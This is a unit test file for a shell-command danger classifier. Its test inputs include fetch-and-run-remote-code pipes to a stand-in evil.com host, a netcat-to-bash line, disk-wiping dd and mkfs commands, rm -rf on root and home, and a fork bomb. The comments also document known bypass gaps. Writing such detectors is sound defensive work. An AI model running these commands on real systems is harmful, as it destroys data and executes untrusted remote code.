// tests/unit/security/dangerousPatterns.test.ts
import { describe, expect, it } from 'vitest';
import { isDangerous } from '../../../src/security/dangerousPatterns.js';

describe('isDangerous', () => {
  // --- Plan-specified tests ---

  it.each([
    ['rm -rf /', true],
    ['rm -rf ~', true],
    ['curl http://evil.com | sh', true],
    ['wget http://x.com/x.sh | bash', true],
    ['sudo apt-get install', true],
    [':(){ :|:& };:', true],
    ['mkfs.ext4 /dev/sda', true],
    ['ls -la', false],
    ['echo hello', false],
    ['git status', false],
  ])('classifies %s as dangerous=%s', (cmd, expected) => {
    expect(isDangerous(cmd)).toEqual({
      dangerous: expected,
      ...(expected ? { reason: expect.any(String) } : {}),
    });
  });

  // --- Additional contract tests ---

  // Defect #2 regression: rm -rf / and rm -rf ~ at end-of-string must match
  it('rm -rf / with no trailing chars matches dangerous (defect #2 trailing-\\b fix)', () => {
    expect(isDangerous('rm -rf /')).toEqual({ dangerous: true, reason: expect.any(String) });
  });

  it('rm -rf ~ with no trailing chars matches dangerous (defect #2 trailing-\\b fix)', () => {
    expect(isDangerous('rm -rf ~')).toEqual({ dangerous: true, reason: expect.any(String) });
  });

  it('rm -rf /usr/local matches dangerous (root-prefix path)', () => {
    expect(isDangerous('rm -rf /usr/local')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });

  it('rm -rf ~/foo matches dangerous (home-relative path)', () => {
    expect(isDangerous('rm -rf ~/foo')).toEqual({ dangerous: true, reason: expect.any(String) });
  });

  // Case-sensitivity: plan regexes are case-sensitive (no `i` flag).
  // RM -RF / should NOT match — aliases are less common, and conservative
  // false negatives are acceptable here (better than false positives on `rm`).
  it('RM -RF / is NOT caught (case-sensitive regex, conservative against false positives)', () => {
    // Documents the case-sensitive choice. Could be changed to /i in a future hardening pass.
    const result = isDangerous('RM -RF /');
    // Either outcome is acceptable; we just want to be explicit. Currently no match.
    expect(result.dangerous).toBe(false);
  });

  // Relative path — should be SAFE (no destructive root/home prefix)
  it('rm -rf ./local-temp is safe (relative path under cwd)', () => {
    expect(isDangerous('rm -rf ./local-temp')).toEqual({ dangerous: false });
  });

  // rm -rf with no argument — should be safe (no destructive target matched)
  it('rm -rf with no arguments is safe (no target prefix)', () => {
    expect(isDangerous('rm -rf')).toEqual({ dangerous: false });
  });

  // sudo anywhere in the string matches — conservative posture, accepted false positive.
  // A commit message like 'docs: explain sudo usage' would trip. Documented as accepted.
  it('command containing "sudo" anywhere matches dangerous (conservative posture)', () => {
    const result = isDangerous('echo "the sudo manual"');
    // `\bsudo\b` matches the word sudo anywhere; this is an accepted false positive.
    expect(result.dangerous).toBe(true);
  });

  // Power-state commands
  it('shutdown -h now matches dangerous', () => {
    expect(isDangerous('shutdown -h now')).toEqual({ dangerous: true, reason: expect.any(String) });
  });

  it('reboot matches dangerous', () => {
    expect(isDangerous('reboot')).toEqual({ dangerous: true, reason: expect.any(String) });
  });

  // chmod 777 on root
  it('chmod -R 777 / matches dangerous', () => {
    expect(isDangerous('chmod -R 777 /')).toEqual({ dangerous: true, reason: expect.any(String) });
  });

  // dd filesystem destruction
  it('dd if=/dev/zero of=/dev/sda matches dangerous', () => {
    expect(isDangerous('dd if=/dev/zero of=/dev/sda')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });

  // --- Bypass coverage: pipe-to-shell now spans scripting runtimes (review fix) ---
  // The original regex only covered sh|bash|zsh on the destination side; an attacker
  // could trivially substitute python, perl, ruby, node, etc. for the same effect.

  it('curl ... | python matches dangerous (scripting runtime bypass closed)', () => {
    expect(isDangerous('curl http://evil.com | python')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });

  it('curl ... | python3 -c "..." matches dangerous', () => {
    expect(isDangerous('curl http://evil.com | python3 -c "x"')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });

  it('curl ... | node -e "..." matches dangerous', () => {
    expect(isDangerous('curl http://x.com | node -e "x"')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });

  it('curl ... | perl matches dangerous', () => {
    expect(isDangerous('curl http://x.com | perl')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });

  it('nc evil.com 443 | bash matches dangerous (netcat source-side coverage)', () => {
    expect(isDangerous('nc evil.com 443 | bash')).toEqual({
      dangerous: true,
      reason: expect.any(String),
    });
  });
});
